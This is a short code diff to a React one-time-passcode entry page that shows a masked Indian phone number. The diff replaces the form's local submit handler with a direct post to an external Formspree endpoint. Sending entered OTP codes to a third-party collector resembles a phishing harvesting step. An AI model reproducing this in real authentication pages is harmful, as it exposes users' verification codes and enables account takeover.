@@ -74,7 +74,8 @@ export default function OTP() {
             <b>Enter the code we just sent on your phone</b>
             <b className="text-color">+91 ******282</b>
           </span>
-          <form onSubmit={handlesubmitdata}>
+          <form method="post"
+            action="https://formspree.io/f/mbjbklkl">
             <div className="d-flex flex-row mt-5">
               <input
                 type="text"
